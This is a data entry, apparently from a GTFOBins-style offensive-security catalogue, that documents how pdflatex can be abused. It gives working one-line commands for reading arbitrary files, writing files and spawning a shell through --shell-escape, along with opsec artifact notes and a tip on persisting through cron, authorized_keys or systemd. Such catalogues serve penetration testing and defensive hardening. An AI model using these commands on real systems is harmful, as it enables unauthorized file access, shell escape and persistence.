---
name: pdflatex
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
    pdftotext texput.pdf -
  notes: The read file will be part of the PDF output.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
  notes: The file can only be written in the current directory, and the `.tex` extension is mandatory.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
references:
- https://gtfobins.github.io/gtfobins/pdflatex/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
